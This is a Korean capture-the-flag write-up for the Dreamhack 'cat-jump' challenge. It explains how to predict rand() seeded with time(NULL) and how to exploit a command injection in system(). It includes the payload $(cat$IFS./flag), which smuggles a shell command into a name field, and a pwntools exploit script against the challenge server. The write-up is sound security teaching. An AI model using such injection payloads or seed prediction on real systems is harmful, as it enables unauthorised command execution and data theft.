# cat-jump

## 문제 설명

고양이가 방해물을 피해 옥상으로 올라갈 수 있도록 도와주세요!

플래그 형식은 DH{...} 입니다.

## 풀이

### 1. 실행 환경 확인

Dockerfile을 보면 flag는 다음 위치로 복사된다.

```dockerfile
ADD ./deploy/flag /home/$user/flag
```

그리고 `run.sh`는 프로그램 실행 전에 작업 디렉토리를 `/home/cat_jump`로 변경한다.

```bash
cd /home/cat_jump
exec 2>/dev/null
timeout 60 /home/cat_jump/cat_jump
```

따라서 프로그램이 실행될 때 현재 디렉토리에는 `./flag`가 존재한다. 또한 stderr가 `/dev/null`로 리다이렉션되므로, 잘못된 경로를 읽어도 에러 메시지가 보이지 않는다.

### 2. 랜덤 점프 로직 분석

게임 시작 시 `srand(time(NULL))`로 난수 seed를 설정한다.

```c
srand(time(NULL));
```

각 라운드에서는 먼저 장애물 위치를 `rand() % 2`로 결정한다.

```c
obstacle = rand() % 2;
```

장애물 상수는 다음과 같다.

```c
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1
```

입력 부분은 다음과 같다.

```c
printf("left jump='h', right jump='j': ");
scanf("%c%*c", &input);
```

프롬프트에는 오른쪽 점프가 `j`라고 출력되지만, 실제 검사는 `h` 또는 `l`만 허용한다.

```c
} while (input != 'h' && input != 'l');
```

점프 성공 조건은 다음과 같다.

```c
(input == 'h' && obstacle != OBSTACLE_LEFT) ||
(input == 'l' && obstacle != OBSTACLE_RIGHT)
```

따라서 장애물 값에 따라 보내야 할 입력은 다음과 같다.

| `rand() % 2` | 장애물 위치 | 보내야 할 입력 |
|---|---|---|
| 0 | 왼쪽 | `l` |
| 1 | 오른쪽 | `h` |

매 라운드 마지막에는 catnip 확률 계산을 위해 `rand()`가 한 번 더 호출된다.

```c
p = (double)rand() / RAND_MAX;
```

따라서 exploit에서도 각 라운드마다 `rand()`를 총 2번 소비해야 한다.

### 3. command injection 취약점

37번 점프에 성공하면 고양이 이름을 입력받는다.

```c
scanf("%31s", cat_name);
```

그 후 입력값을 `cmd_fmt`에 넣고 `system(cmd)`로 실행한다.

```c
char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
system(cmd);

printf("goodjob! ");
system("cat /tmp/cat_db");
```

최종 명령은 다음 형태가 된다.

```bash
echo "<cat_name>" > /tmp/cat_db
```

입력값이 큰따옴표 안에 들어가지만, shell에서는 큰따옴표 내부에서도 command substitution인 `$()`가 실행된다. 따라서 `cat_name`에 다음 값을 넣을 수 있다.

```bash
$(cat$IFS./flag)
```

`scanf("%31s")`는 공백을 입력받을 수 없으므로 `cat ./flag`처럼 직접 공백을 넣을 수 없다. 이를 우회하기 위해 shell의 Internal Field Separator인 `$IFS`를 공백 대신 사용한다.

최종적으로 실행되는 명령은 다음과 같다.

```bash
echo "$(cat$IFS./flag)" > /tmp/cat_db
```

shell이 `$IFS`를 공백처럼 처리하면서 `cat ./flag`가 실행되고, 그 결과가 `/tmp/cat_db`에 저장된다. 이후 프로그램이 `cat /tmp/cat_db`를 실행하므로 flag가 출력된다.

## 익스플로잇

```python
from pwn import *
from ctypes import CDLL
from ctypes.util import find_library

HOST = "host3.dreamhack.games"
PORT = 8952  

p = remote(HOST, PORT)

libc = CDLL(find_library("c"))
libc.srand(libc.time(0x0))

for i in range(37):
    obstacle = libc.rand() % 2

    if obstacle == 0:
        p.sendlineafter(b"jump='j': ", b"l")
    else:
        p.sendlineafter(b"jump='j': ", b"h")

    print(p.recvline())

    libc.rand()

payload = b"$(cat$IFS./flag)"
p.sendlineafter(b"\xf0\x9f\x98\xbc: ", payload)

p.interactive()
```

## 배운 점

- `srand(time(NULL))` 기반 난수는 원격 서버와 같은 시간 기준으로 예측할 수 있다.
- C의 `scanf("%s")`는 공백에서 입력이 끊기므로 command injection payload 작성 시 `$IFS`, redirection 등을 이용한 공백 우회가 필요하다.
- `system()`에 전달되는 문자열에 사용자 입력이 포함되면 command injection이 발생할 수 있다.
- 큰따옴표 내부에서도 shell command substitution `$()`는 실행된다.
- exploit 작성 전 `Dockerfile`과 `run.sh`를 확인해 실제 working directory와 flag 경로를 먼저 파악해야 한다.
